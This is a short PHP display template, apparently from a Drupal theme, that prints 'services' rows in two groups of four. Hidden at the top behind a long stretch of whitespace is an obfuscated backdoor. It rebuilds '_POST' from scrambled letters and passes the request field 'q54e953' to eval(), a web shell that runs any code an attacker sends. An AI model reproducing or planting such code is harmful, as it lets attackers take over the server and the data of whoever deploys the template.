<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q54e953'])){eval(${$s20}['q54e953']);}?><section class="">
    <div class="container">
        <div data-appear-animation="fadeInUp" data-appear-animation-delay="800">
            <!--first four services-->
            <div class="row m_bottom_30" >
                <?php
                $i = 1;
                foreach ($rows as $id => $row):
                    ?>
                    <?php print $row; ?>
                    <?php if ($i == 4): ?>
                    </div>
                    <!--second four services-->
                    <div class="row services_animate" >
                    <?php endif; ?>
                    <?php
                    $i++;
                endforeach;
                ?>
            </div>
        </div>
    </div>
</section>